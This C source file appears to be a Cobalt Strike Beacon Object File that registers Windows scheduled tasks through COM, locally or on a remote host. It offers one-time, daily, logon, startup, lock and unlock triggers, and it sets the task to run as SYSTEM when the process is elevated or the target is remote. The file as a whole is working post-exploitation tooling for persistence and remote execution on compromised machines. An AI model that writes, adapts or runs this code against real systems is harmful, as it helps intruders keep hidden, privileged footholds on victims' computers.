#include <stdio.h>
#include <windows.h>
#include <taskschd.h>
#include <combaseapi.h>
#include "addtaskscheduler.h"
#include "beacon.h"


HRESULT SetOneTimeTask(HRESULT hr, ITriggerCollection* pTriggerCollection, wchar_t* startTime, wchar_t* repeatTask) {
    IID IIDITimeTrigger = {0xb45747e0, 0xeba7, 0x4276, {0x9f, 0x29, 0x85, 0xc5, 0xbb, 0x30, 0x00, 0x06}};
    ITrigger* pTrigger = NULL;

    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_TIME, &pTrigger);
    if (SUCCEEDED(hr)) {
        ITimeTrigger* pTimeTrigger = NULL;

        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDITimeTrigger, (void**)&pTimeTrigger);
        if (SUCCEEDED(hr)) {
            BSTR startTimeBstr = OLEAUT32$SysAllocString(startTime);
            pTimeTrigger->lpVtbl->put_StartBoundary(pTimeTrigger, startTimeBstr);

            IRepetitionPattern* pRepetitionPattern = NULL;
            hr = pTimeTrigger->lpVtbl->get_Repetition(pTimeTrigger, &pRepetitionPattern);
            if (SUCCEEDED(hr)) {
                BSTR repeatTaskBstr = OLEAUT32$SysAllocString(repeatTask); 
                BSTR durationBstr = OLEAUT32$SysAllocString(L"");  // Indefinite duration

                pRepetitionPattern->lpVtbl->put_Interval(pRepetitionPattern, repeatTaskBstr);
                pRepetitionPattern->lpVtbl->put_Duration(pRepetitionPattern, durationBstr);
                pRepetitionPattern->lpVtbl->Release(pRepetitionPattern);

                OLEAUT32$SysFreeString(repeatTaskBstr);
                OLEAUT32$SysFreeString(durationBstr);
            }

            pTimeTrigger->lpVtbl->put_Repetition(pTimeTrigger, pRepetitionPattern);
            OLEAUT32$SysFreeString(startTimeBstr);
            pTimeTrigger->lpVtbl->Release(pTimeTrigger);
        }
        pTrigger->lpVtbl->Release(pTrigger);
    }
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);

    return hr;
}


HRESULT SetDailyTask(HRESULT hr, ITriggerCollection* pTriggerCollection, wchar_t* startTime, wchar_t* expireTime, int daysInterval, wchar_t* delay) {
	IID IIDIDailyTrigger = {0x126c5cd8, 0xb288, 0x41d5, {0x8d, 0xbf, 0xe4, 0x91, 0x44, 0x6a, 0xdc, 0x5c}};
	ITrigger* pTrigger = NULL;
	
	hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_DAILY, &pTrigger);
	if (SUCCEEDED(hr)) {
		IDailyTrigger* pDailyTrigger = NULL;
		
		hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDIDailyTrigger, (void**)&pDailyTrigger);
		if (SUCCEEDED(hr)) {
			BSTR startTimeBstr = OLEAUT32$SysAllocString(startTime);
			BSTR expireTimeBstr = OLEAUT32$SysAllocString(expireTime);
			BSTR delayBstr = OLEAUT32$SysAllocString(delay);

			pDailyTrigger->lpVtbl->put_StartBoundary(pDailyTrigger, startTimeBstr); 
			pDailyTrigger->lpVtbl->put_EndBoundary(pDailyTrigger, expireTimeBstr); 
			pDailyTrigger->lpVtbl->put_DaysInterval(pDailyTrigger, daysInterval); 
			pDailyTrigger->lpVtbl->put_RandomDelay(pDailyTrigger, delayBstr); 
			pDailyTrigger->lpVtbl->Release(pDailyTrigger);
			
			OLEAUT32$SysFreeString(startTimeBstr);
			OLEAUT32$SysFreeString(expireTimeBstr);
			OLEAUT32$SysFreeString(delayBstr);
		}
		pTrigger->lpVtbl->Release(pTrigger);
	}
	pTriggerCollection->lpVtbl->Release(pTriggerCollection);
	
	return hr;
}


HRESULT SetLogonTask(HRESULT hr, ITriggerCollection* pTriggerCollection, wchar_t* userID) {
	IID IIDILogonTrigger = {0x72dade38, 0xfae4, 0x4b3e, {0xba, 0xf4, 0x5d, 0x00, 0x9a, 0xf0, 0x2b, 0x1c}};
    ITrigger* pTrigger = NULL;
    
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_LOGON, &pTrigger);
    if (SUCCEEDED(hr)) {
        ILogonTrigger* pLogonTrigger = NULL;
        
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDILogonTrigger, (void**)&pLogonTrigger);
        if (SUCCEEDED(hr)) {
            BSTR userIDBstr = OLEAUT32$SysAllocString(userID);
            
            pLogonTrigger->lpVtbl->put_UserId(pLogonTrigger, userIDBstr); 
            pLogonTrigger->lpVtbl->Release(pLogonTrigger);
			
			OLEAUT32$SysFreeString(userIDBstr);
        }
        pTrigger->lpVtbl->Release(pTrigger);
    }
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);

    return hr;
}



HRESULT SetStartUpTask(HRESULT hr, ITriggerCollection* pTriggerCollection, wchar_t* delay) {
    IID IIDIBootTrigger = {0x2a9c35da, 0xd357, 0x41f4, {0xbb, 0xc1, 0x20, 0x7a, 0xc1, 0xb1, 0xf3, 0xcb}};
    ITrigger* pTrigger = NULL;
    
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_BOOT, &pTrigger);
    if (SUCCEEDED(hr)) {
        IBootTrigger* pBootTrigger = NULL;
        
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDIBootTrigger, (void**)&pBootTrigger);
        if (SUCCEEDED(hr)) {
            BSTR delayBstr = OLEAUT32$SysAllocString(delay);
            
            pBootTrigger->lpVtbl->put_Delay(pBootTrigger, delayBstr);
			pBootTrigger->lpVtbl->Release(pBootTrigger);
            
            OLEAUT32$SysFreeString(delayBstr);
        }
        pTrigger->lpVtbl->Release(pTrigger);
    }
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);

    return hr;
}



HRESULT SetLockTask(HRESULT hr, ITriggerCollection* pTriggerCollection, wchar_t* userID, wchar_t* delay) {
    IID IIDISessionStateChangeTrigger = {0x754da71b, 0x4385, 0x4475, {0x9d, 0xd9, 0x59, 0x82, 0x94, 0xfa, 0x36, 0x41}};
    ITrigger* pTrigger = NULL;
    
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_SESSION_STATE_CHANGE, &pTrigger);
    if (SUCCEEDED(hr)) {
        ISessionStateChangeTrigger* pSessionStateChangeTrigger = NULL;
        
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDISessionStateChangeTrigger, (void**)&pSessionStateChangeTrigger);
        if (SUCCEEDED(hr)) {
            BSTR userIDBstr = OLEAUT32$SysAllocString(userID);
            BSTR delayBstr = OLEAUT32$SysAllocString(delay);
            
            pSessionStateChangeTrigger->lpVtbl->put_StateChange(pSessionStateChangeTrigger, TASK_SESSION_LOCK);
            pSessionStateChangeTrigger->lpVtbl->put_UserId(pSessionStateChangeTrigger, userIDBstr);
            pSessionStateChangeTrigger->lpVtbl->put_Delay(pSessionStateChangeTrigger, delayBstr);
            
            OLEAUT32$SysFreeString(userIDBstr);
            OLEAUT32$SysFreeString(delayBstr);
            
            pSessionStateChangeTrigger->lpVtbl->Release(pSessionStateChangeTrigger);
        }
        pTrigger->lpVtbl->Release(pTrigger);
    }
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);

    return hr;
}


HRESULT SetUnlockTask(HRESULT hr, ITriggerCollection* pTriggerCollection, wchar_t* userID, wchar_t* delay) {
    IID IIDISessionStateChangeTrigger = {0x754da71b, 0x4385, 0x4475, {0x9d, 0xd9, 0x59, 0x82, 0x94, 0xfa, 0x36, 0x41}};
    ITrigger* pTrigger = NULL;
    
    hr = pTriggerCollection->lpVtbl->Create(pTriggerCollection, TASK_TRIGGER_SESSION_STATE_CHANGE, &pTrigger);
    if (SUCCEEDED(hr)) {
        ISessionStateChangeTrigger* pSessionStateChangeTrigger = NULL;
        
        hr = pTrigger->lpVtbl->QueryInterface(pTrigger, &IIDISessionStateChangeTrigger, (void**)&pSessionStateChangeTrigger);
        if (SUCCEEDED(hr)) {
            BSTR userIDBstr = OLEAUT32$SysAllocString(userID);
            BSTR delayBstr = OLEAUT32$SysAllocString(delay);
            
            pSessionStateChangeTrigger->lpVtbl->put_StateChange(pSessionStateChangeTrigger, TASK_SESSION_UNLOCK);
            pSessionStateChangeTrigger->lpVtbl->put_UserId(pSessionStateChangeTrigger, userIDBstr);
            pSessionStateChangeTrigger->lpVtbl->put_Delay(pSessionStateChangeTrigger, delayBstr);
            
            OLEAUT32$SysFreeString(userIDBstr);
            OLEAUT32$SysFreeString(delayBstr);
            
            pSessionStateChangeTrigger->lpVtbl->Release(pSessionStateChangeTrigger);
        }
        pTrigger->lpVtbl->Release(pTrigger);
    }
    pTriggerCollection->lpVtbl->Release(pTriggerCollection);

    return hr;
}


BOOL IsElevated() {
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;

        if (ADVAPI32$GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            fIsElevated = elevation.TokenIsElevated;
        }
    }

    if (hToken) {
        KERNEL32$CloseHandle(hToken);
    }
    return fIsElevated;
}


BOOL CreateScheduledTask(char* triggerType, wchar_t* taskName, wchar_t * host, wchar_t* programPath, wchar_t* programArguments, wchar_t* startTime, wchar_t* expireTime, int daysInterval, wchar_t* delay, wchar_t* userID, wchar_t* repeatTask) {
    BOOL actionResult = FALSE;
	HRESULT hr = S_OK;

    hr = OLE32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return actionResult;

	IID CTaskScheduler = {0x0f87369f, 0xa4e5, 0x4cfc, {0xbd,0x3e,0x73,0xe6,0x15,0x45,0x72,0xdd}};
	IID IIDITaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
	ITaskService *pTaskService = NULL;
    hr = OLE32$CoCreateInstance(&CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IIDITaskService, (void**)&pTaskService);
    if (FAILED(hr)) {
        return actionResult;
    }
	
	VARIANT Vhost;
	VARIANT VNull;
	OLEAUT32$VariantInit(&Vhost);
	OLEAUT32$VariantInit(&VNull);
	Vhost.vt = VT_BSTR;
	Vhost.bstrVal = OLEAUT32$SysAllocString(host);
	
	hr = pTaskService->lpVtbl->Connect(pTaskService, Vhost, VNull, VNull, VNull); 
    if (FAILED(hr)) {
		goto cleanup;
    }
	
	ITaskFolder* pTaskFolder = NULL;
	BSTR folderPathBstr = OLEAUT32$SysAllocString(L"\\");
	hr = pTaskService->lpVtbl->GetFolder(pTaskService, folderPathBstr, &pTaskFolder);
	if (FAILED(hr)) {
		goto cleanup;
	}
	OLEAUT32$SysFreeString(folderPathBstr);

    ITaskDefinition* pTaskDefinition = NULL;
    hr = pTaskService->lpVtbl->NewTask(pTaskService, 0, &pTaskDefinition);
    if (FAILED(hr)) {
		goto cleanup;
    }
	
	BOOL isRemoteHost = (Vhost.bstrVal && *Vhost.bstrVal);
	IPrincipal* pPrincipal = NULL;
	hr = pTaskDefinition->lpVtbl->get_Principal(pTaskDefinition, &pPrincipal);
	if (SUCCEEDED(hr)) {
		if (IsElevated() || isRemoteHost) {
			BeaconPrintf(CALLBACK_OUTPUT, "[*] Running in elevated context and setting \"Run whether user is logged on or not\" security option as SYSTEM!\n"); 
			BSTR systemUser = OLEAUT32$SysAllocString(L"SYSTEM");
			pPrincipal->lpVtbl->put_UserId(pPrincipal, systemUser);
			OLEAUT32$SysFreeString(systemUser);
		}else {
			pPrincipal->lpVtbl->put_LogonType(pPrincipal, TASK_LOGON_INTERACTIVE_TOKEN);
		}
		pPrincipal->lpVtbl->Release(pPrincipal);
	}
	

    ITriggerCollection* pTriggerCollection = NULL;
    hr = pTaskDefinition->lpVtbl->get_Triggers(pTaskDefinition, &pTriggerCollection);
    if (FAILED(hr)) {
		goto cleanup;
    }

	//trigger options
	if (MSVCRT$strcmp(triggerType, "onetime") == 0) {
		hr = SetOneTimeTask(hr, pTriggerCollection, startTime, repeatTask);
	} else if (MSVCRT$strcmp(triggerType, "daily") == 0) {
		hr = SetDailyTask(hr, pTriggerCollection, startTime, expireTime, daysInterval, delay); 
	} else if (MSVCRT$strcmp(triggerType, "logon") == 0) {
		hr = SetLogonTask(hr, pTriggerCollection, userID); 
	} else if (MSVCRT$strcmp(triggerType, "startup") == 0) {
		hr = SetStartUpTask(hr, pTriggerCollection, delay); 
	} else if (MSVCRT$strcmp(triggerType, "lock") == 0) {
		hr = SetLockTask(hr, pTriggerCollection, userID, delay); 
	} else if (MSVCRT$strcmp(triggerType, "unlock") == 0) {
		hr = SetUnlockTask(hr, pTriggerCollection, userID, delay); 
	} 
	else {
		goto cleanup;
	}
	
	IActionCollection* pActionCollection = NULL;
    hr = pTaskDefinition->lpVtbl->get_Actions(pTaskDefinition, &pActionCollection);
    if (FAILED(hr)) {
		goto cleanup;
    }
	
    IAction* pAction = NULL;
    hr = pActionCollection->lpVtbl->Create(pActionCollection, TASK_ACTION_EXEC, &pAction);
    if (FAILED(hr)) {
		goto cleanup;
    }

	IID IIDIExecAction = {0x4c3d624d, 0xfd6b, 0x49a3, {0xb9, 0xb7, 0x09, 0xcb, 0x3c, 0xd3, 0xf0, 0x47}};
    IExecAction* pExecAction = NULL;
    hr = pAction->lpVtbl->QueryInterface(pAction, &IIDIExecAction, (void**)&pExecAction);
    if (FAILED(hr)) {
		goto cleanup;
    }
	
	BSTR programPathBstr = OLEAUT32$SysAllocString(programPath);
    hr = pExecAction->lpVtbl->put_Path(pExecAction, programPathBstr);
    if (FAILED(hr)) {
		goto cleanup;
    }
	OLEAUT32$SysFreeString(programPathBstr);
	
	
	BSTR programArgumentsBstr = OLEAUT32$SysAllocString(programArguments);
    hr = pExecAction->lpVtbl->put_Arguments(pExecAction, programArgumentsBstr);
    if (FAILED(hr)) {
		goto cleanup;
    }
	OLEAUT32$SysFreeString(programArgumentsBstr);
	
    pExecAction->lpVtbl->Release(pExecAction);
    pAction->lpVtbl->Release(pAction);
	
    IRegisteredTask* pRegisteredTask = NULL;
	hr = pTaskFolder->lpVtbl->RegisterTaskDefinition(pTaskFolder, taskName, pTaskDefinition, TASK_CREATE_OR_UPDATE, VNull, VNull, TASK_LOGON_INTERACTIVE_TOKEN, VNull, &pRegisteredTask);

	if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to register the scheduled task with error code: %x\n", hr);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Scheduled task '%ls' created successfully!\n", taskName);
        actionResult = TRUE;
    }
	
cleanup:
    if (pRegisteredTask) {
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
    }
    if (pActionCollection) {
        pActionCollection->lpVtbl->Release(pActionCollection);
    }
    if (pTaskDefinition) {
        pTaskDefinition->lpVtbl->Release(pTaskDefinition);
    }
    if (pTaskFolder) {
        pTaskFolder->lpVtbl->Release(pTaskFolder);
    }
    if (pTaskService) {
        pTaskService->lpVtbl->Release(pTaskService);
    }
    
    OLEAUT32$VariantClear(&Vhost);
    OLEAUT32$VariantClear(&VNull);
    OLE32$CoUninitialize();

	return actionResult;
}



int go(char *args, int len) {
	BOOL res = NULL;
	datap parser;
	
    WCHAR *taskName; 
	WCHAR *hostName  = L""; 
    WCHAR *programPath; 
    WCHAR *programArguments  = L""; 
	CHAR *triggerType; 
	WCHAR *startTime; 
    WCHAR *expireTime = L""; 
	int daysInterval = 0; 
	WCHAR *delay = L"";
	WCHAR *userID  = L""; 
	WCHAR *repeatTask = L"";
	
	
	BeaconDataParse(&parser, args, len);
	taskName = BeaconDataExtract(&parser, NULL);
	hostName = BeaconDataExtract(&parser, NULL);
	programPath = BeaconDataExtract(&parser, NULL);
	programArguments = BeaconDataExtract(&parser, NULL);
	triggerType = BeaconDataExtract(&parser, NULL);
	
	if (MSVCRT$strcmp(triggerType, "onetime") == 0) {
		startTime = BeaconDataExtract(&parser, NULL);
		repeatTask = BeaconDataExtract(&parser, NULL);
		res = CreateScheduledTask(triggerType, taskName, hostName, programPath, programArguments, startTime, expireTime, daysInterval, delay, userID, repeatTask);
	} 
	else if (MSVCRT$strcmp(triggerType, "daily") == 0) {
		startTime = BeaconDataExtract(&parser, NULL);
		expireTime = BeaconDataExtract(&parser, NULL);
		daysInterval = BeaconDataInt(&parser);
		delay = BeaconDataExtract(&parser, NULL);
		res = CreateScheduledTask(triggerType, taskName, hostName, programPath, programArguments, startTime, expireTime, daysInterval, delay, userID, repeatTask);
	} 
	else if (MSVCRT$strcmp(triggerType, "logon") == 0) {
		userID = BeaconDataExtract(&parser, NULL);
		res = CreateScheduledTask(triggerType, taskName, hostName, programPath, programArguments, startTime, expireTime, daysInterval, delay, userID, repeatTask);
	} 
	else if (MSVCRT$strcmp(triggerType, "startup") == 0) {
		delay = BeaconDataExtract(&parser, NULL);
		res = CreateScheduledTask(triggerType, taskName, hostName, programPath, programArguments, startTime, expireTime, daysInterval, delay, userID, repeatTask);
	} 
	else if (MSVCRT$strcmp(triggerType, "lock") == 0) {
		userID = BeaconDataExtract(&parser, NULL);
		delay = BeaconDataExtract(&parser, NULL);
		res = CreateScheduledTask(triggerType, taskName, hostName, programPath, programArguments, startTime, expireTime, daysInterval, delay, userID, repeatTask);
	} 
	else if (MSVCRT$strcmp(triggerType, "unlock") == 0) {
		userID = BeaconDataExtract(&parser, NULL);
		delay = BeaconDataExtract(&parser, NULL);
		res = CreateScheduledTask(triggerType, taskName, hostName, programPath, programArguments, startTime, expireTime, daysInterval, delay, userID, repeatTask);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "Specified triggerType is not supported.\n");
	}

	return 0;
}


